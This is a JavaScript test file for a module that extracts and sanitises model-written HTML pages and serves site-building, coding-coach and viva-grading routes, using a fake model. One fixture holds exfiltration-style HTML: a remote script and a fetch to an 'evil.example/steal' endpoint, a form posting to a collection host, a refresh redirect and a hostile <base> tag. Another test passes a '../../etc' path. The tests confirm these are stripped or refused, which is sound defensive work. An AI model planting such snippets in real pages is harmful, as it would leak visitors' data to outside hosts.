// Skills (skills.js): HTML extraction/sanitising, slugs, JSON parsing, and the routes with a fake model.
// Run: node tests/skills.test.js
const fs = require('fs'), os = require('os'), path = require('path');
const S = require(path.join(__dirname, '..', 'skills.js'));
let fail = 0, total = 0;
const check = (n, ok, x) => { total++; if (!ok) { fail++; console.log('FAIL  ' + n + (x !== undefined ? ' — ' + JSON.stringify(x) : '')); } };

check('slugify', S.slugify('My College Fest 2026!') === 'my-college-fest-2026' && S.slugify('') === 'my-website' && S.slugify("Tejas's Portfolio") === 'tejass-portfolio');
check('extract from fences + chatter', S.extractHtml('Sure! Here it is:\n```html\n<!DOCTYPE html><html><body>Hi</body></html>\n```\nEnjoy!') === '<!DOCTYPE html><html><body>Hi</body></html>');
check('extract adds doctype', S.extractHtml('<html><body>x</body></html>').startsWith('<!DOCTYPE html>'));
check('extract trims text after </html>', S.extractHtml('<!DOCTYPE html><html><body>x</body></html> trailing words') .endsWith('</html>'));
check('not a page → null', S.extractHtml('I cannot do that.') === null);
const dirty = '<html><body><script src="https://evil.example/x.js"></script><form action="https://collect.example/">' +
  '<input></form><script>fetch("https://evil.example/steal")</script><meta http-equiv="refresh" content="0;url=https://x"></body></html>';
const clean = S.sanitizeHtml(dirty);
check('sanitize: remote script removed', !/evil\.example\/x\.js/.test(clean));
check('sanitize: form action removed', !/collect\.example/.test(clean));
check('sanitize: remote fetch neutralised', !/fetch\("https/.test(clean));
check('sanitize: refresh redirect removed', !/http-equiv\s*=\s*["']?refresh/i.test(clean));
{   // the page's own rules: it may run its own script and style, and talk to nobody
  const csp = (clean.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/) || [])[1] || '';
  check('sanitize: a Content-Security-Policy tag goes at the top of <head> (or a head is made if there is none)', !!csp && /<head>\s*<meta http-equiv="Content-Security-Policy"/.test(S.sanitizeHtml('<html><head><title>t</title></head><body></body></html>')) && /^<html>\s*<head><meta http-equiv="Content-Security-Policy"/.test(clean));
  check('sanitize: the policy allows nothing by default, and no outside connection, frame, form, object or <base>', /default-src 'none'/.test(csp) && /connect-src 'none'/.test(csp) && /frame-src 'none'/.test(csp) && /form-action 'none'/.test(csp) && /object-src 'none'/.test(csp) && /base-uri 'none'/.test(csp) && !/https?:|\*/.test(csp));
  check('sanitize: its own inline script and style, and embedded pictures, still work', /script-src 'unsafe-inline'/.test(csp) && /style-src 'unsafe-inline'/.test(csp) && /img-src 'self' data: blob:/.test(csp));
  const loose = S.sanitizeHtml('<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content="default-src *"><base href="https://evil.example/"><title>x</title></head><body><img src="//evil.example/p.gif"></body></html>');
  check('sanitize: a loose policy or a <base> written by the model is replaced / removed — exactly one policy remains', (loose.match(/Content-Security-Policy/g) || []).length === 1 && !/default-src \*/.test(loose) && !/<base/i.test(loose));
  check('sanitize: running it twice does not stack policies', (S.sanitizeHtml(S.sanitizeHtml(dirty)).match(/Content-Security-Policy/g) || []).length === 1);
  check('stripCsp: removes the tag again (so an edit sees the page without it)', !/Content-Security-Policy/.test(S.stripCsp(clean)) && S.stripCsp('<p>x</p>') === '<p>x</p>' && S.stripCsp(null) === '');
}
check('parseJsonLoose: object in chatter', JSON.stringify(S.parseJsonLoose('here: {"a":1} ok')) === '{"a":1}');
check('parseJsonLoose: array', JSON.stringify(S.parseJsonLoose('```json\n["q1","q2"]\n```')) === '["q1","q2"]');
check('parseJsonLoose: junk', S.parseJsonLoose('nope') === null);
{
  const f = S.parseFix('WHAT WENT WRONG: Line 3 uses x before it is defined.\nFIX: Defined x first.\n```python\nx = 1\nprint(x)\n```');
  check('parseFix: explanation + code', /Line 3/.test(f.explanation) && /\*\*Fix:\*\* Defined x first/.test(f.explanation) && f.code === 'x = 1\nprint(x)\n', f);
  const g = S.parseFix('WHAT WENT WRONG: typo\n```\nshort\n```\nand\n```cpp\nint main(){return 0;}\n```');
  check('parseFix: the longest block is the file', /int main/.test(g.code));
  check('parseFix: no code', S.parseFix('I am not sure.').code === '');
}
check('clampScore', S.clampScore(14) === 10 && S.clampScore(-2) === 0 && S.clampScore('7.4') === 7 && S.clampScore('x') === 0);

// routes with a fake model
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sk-'));
let reply = '', lastCall = null;
const llm = { complete: async o => { lastCall = o; if (reply instanceof Error) throw reply; return typeof reply === 'function' ? reply(o) : reply; } };
const opened = [];
const routes = {}; const app = { post: (p, h) => { routes[p] = h; } };
S(app, { llm, DEFAULT_MODEL: 'm', SANDBOX: dir, openPath: p => opened.push(p), rel: p => path.relative(dir, p).split(path.sep).join('/') });
const call = async (p, body) => { let out, code = 200; await routes[p]({ body }, { json: o => { out = o; }, status: c => ({ json: o => { code = c; out = o; } }) }); return { code, ...out }; };
(async () => {
  reply = '```html\n<!DOCTYPE html><html><head><style>body{}</style></head><body><h1>Fest</h1><form action="https://x.y/"><button>Register</button></form></body></html>\n```';
  const r = await call('/api/skill/site', { what: 'college fest', sections: 'events, schedule, register', style: 'dark', name: 'Tech Fest' });
  check('site: written to Projects/<slug>/index.html', r.success && r.file === 'Projects/tech-fest/index.html' && fs.existsSync(path.join(dir, 'Projects', 'tech-fest', 'index.html')), r);
  check('site: opened in the browser', opened.length === 1 && /index\.html$/.test(opened[0]));
  check('site: saved page is sanitised', !/x\.y/.test(fs.readFileSync(path.join(dir, 'Projects', 'tech-fest', 'index.html'), 'utf8')));
  check('site: the brief reaches the model with the rules', /college fest/.test(lastCall.messages[0].content) && /self-contained/.test(lastCall.system));
  check('site: missing brief refused', (await call('/api/skill/site', {})).code === 400);
  reply = 'Sorry, I can only chat.';
  check('site: non-page reply refused, nothing written', (await call('/api/skill/site', { what: 'blog', name: 'blog' })).code === 502 && !fs.existsSync(path.join(dir, 'Projects', 'blog')));
  reply = new Error('Local LLM unavailable');
  check('site: model errors are reported', /unavailable/.test((await call('/api/skill/site', { what: 'x' })).error));

  // edit keeps the previous version and refuses a truncated edit
  reply = '<!DOCTYPE html><html><head><style>body{}</style></head><body><h1 style="color:red">Fest</h1><form><button>Register</button></form></body></html>';
  const e = await call('/api/skill/siteEdit', { name: 'Tech Fest', change: 'make the heading red' });
  check('edit: applied, previous kept', e.success && fs.existsSync(path.join(dir, 'Projects', 'tech-fest', 'index.previous.html')) && /color:red/.test(fs.readFileSync(path.join(dir, 'Projects', 'tech-fest', 'index.html'), 'utf8')));
  reply = '<html><body>x</body></html>';
  check('edit: suspiciously short result refused', (await call('/api/skill/siteEdit', { name: 'Tech Fest', change: 'tiny' })).code === 502 && /color:red/.test(fs.readFileSync(path.join(dir, 'Projects', 'tech-fest', 'index.html'), 'utf8')));
  const rv = await call('/api/skill/siteRevert', { name: 'Tech Fest' });
  check('revert: back to the version before the edit', rv.success && !/color:red/.test(fs.readFileSync(path.join(dir, 'Projects', 'tech-fest', 'index.html'), 'utf8')));
  check('edit: unknown site', (await call('/api/skill/siteEdit', { name: 'nope', change: 'x' })).code === 404);
  check('slug keeps edits inside Projects (no path tricks)', (await call('/api/skill/siteEdit', { name: '../../etc', change: 'x' })).code === 404);

  // coach
  reply = 'Think about a hash map.';
  const h = await call('/api/skill/coach', { problem: 'Two Sum', mode: 'hint', level: 1 });
  check('coach: hint 1 with the no-code rule', h.success && h.text === 'Think about a hash map.' && /hint number 1/.test(lastCall.system) && /Never give the full solution/.test(lastCall.system));
  await call('/api/skill/coach', { problem: 'Two Sum', mode: 'hint', level: 9 });
  check('coach: hint level capped at 3', /hint number 3/.test(lastCall.system));
  await call('/api/skill/coach', { problem: 'Two Sum', mode: 'solution', lang: 'c++' });
  check('coach: solution in the asked language', /in C\+\+/.test(lastCall.system));
  await call('/api/skill/coach', { problem: 'Two Sum', mode: 'check', approach: 'nested loops' });
  check('coach: check sends the approach', /nested loops/.test(lastCall.messages[0].content));
  check('coach: no problem → 400', (await call('/api/skill/coach', {})).code === 400);

  // viva
  reply = '{"questions":["What is a primary key?","Explain normalization.","What is 3NF?","What is a deadlock?","Define ACID."]}';
  const vq = await call('/api/skill/viva/questions', { topic: 'DBMS' });
  check('viva: 5 questions', vq.success && vq.questions.length === 5 && vq.level === 'college (B.Tech)');
  await call('/api/skill/viva/questions', { topic: 'SDE placement interview on Java' });
  check('viva: interview level detected', /placement interview/.test(lastCall.system));
  reply = 'not json';
  check('viva: bad questions → error', (await call('/api/skill/viva/questions', { topic: 'DBMS' })).code === 502);
  reply = '{"score": 12, "feedback": "Good.", "missed": ["uniqueness","not null"], "model_answer": "A primary key uniquely identifies a row."}';
  const g = await call('/api/skill/viva/grade', { topic: 'DBMS', question: 'What is a primary key?', answer: 'it identifies rows' });
  check('viva: grade parsed and clamped', g.success && g.score === 10 && g.missed.length === 2 && /uniquely/.test(g.model));
  reply = 'garbage';
  // an unreadable reply is "ungraded" (a 502 the page already handles), never a silent 0
  reply = 'garbage'; let n0 = 0; llm.complete = async o => { n0++; lastCall = o; return 'garbage'; };
  const ug = await call('/api/skill/viva/grade', { question: 'q', answer: 'a' });
  check('viva: unreadable grade → 502 "ungraded", not a silent 0; it tried twice (the second time asking for ONLY the JSON)', ug.code === 502 && /ungraded/.test(ug.error) && n0 === 2 && /ONLY the JSON object/.test(lastCall.system), [ug, n0]);
  let n1 = 0; llm.complete = async o => { n1++; lastCall = o; return n1 === 1 ? 'Sure! The student did well.' : '{"score": 7, "feedback": "ok"}'; };
  const rt = await call('/api/skill/viva/grade', { question: 'q', answer: 'a' });
  check('viva: a first reply that holds no score is retried and the second one is used', rt.success && rt.score === 7 && n1 === 2, rt);
  llm.complete = async o => { lastCall = o; throw new Error('model busy'); };
  check('viva: if the AI itself fails the error is passed on (no fake score)', (await call('/api/skill/viva/grade', { question: 'q', answer: 'a' })).code >= 500);
  llm.complete = async o => { lastCall = o; if (reply instanceof Error) throw reply; return typeof reply === 'function' ? reply(o) : reply; };
  const G = S.extractGrade;
  check('extractGrade: JSON, "7/10", "7 out of 10", text "70", 70 as a number, loose "score: 8" line', G('{"score":"7/10"}').score === 7 && G('{"score":"7 out of 10"}').score === 7 && G('{"score":"70"}').score === 7 && G('{"score": 85}').score === 9 && G('Score: 8. Good answer.').score === 8 && G('"score" = 6/10').score === 6);
  check('extractGrade: 12 is capped to 10 (not read as 1.2), 0 stays a real 0, decimals round', G('{"score":12}').score === 10 && G('{"score":0}').score === 0 && G('{"score":6.6}').score === 7 && G('{"score": 100}').score === 10);
  check('extractGrade: fenced JSON, JSON inside chatter, an array, "grade"/"mark" names', G('Here you go:\n```json\n{"score": 4, "feedback": "weak"}\n```').score === 4 && G('blah {"score": 9} blah').score === 9 && G('[{"score": 3}]').score === 3 && G('{"grade": 5}').score === 5 && G('{"mark": "8/10"}').score === 8);
  check('extractGrade: feedback, missed (string or list, max 4) and the model answer are carried', (() => { const g = G('{"score":5,"feedback":"f","missed":"one point","model_answer":"m"}'); const h = G('{"score":5,"missed":["a","b","c","d","e"]}'); return g.feedback === 'f' && g.missed.join() === 'one point' && g.model === 'm' && h.missed.length === 4; })());
  check('extractGrade: nothing readable → null (empty, garbage, null score, negative, no number, huge)', ['', null, 'garbage', '{"score": null}', '{"score": "good"}', '{"score": -3}', '{"score": 5000}', '{"feedback":"fine"}', 'The score is high'].every(x => G(x) === null), ['', null, 'garbage', '{"score": null}', '{"score": "good"}', '{"score": -3}', '{"score": 5000}', '{"feedback":"fine"}', 'The score is high'].filter(x => G(x) !== null));
  const never = await S.gradeWithRetry(async () => 'nope'); check('gradeWithRetry: gives up with null after two tries', never === null);

  fs.rmSync(dir, { recursive: true, force: true });
  console.log(`skills: ${total - fail}/${total}`);
  process.exitCode = fail ? 1 : 0;
})();
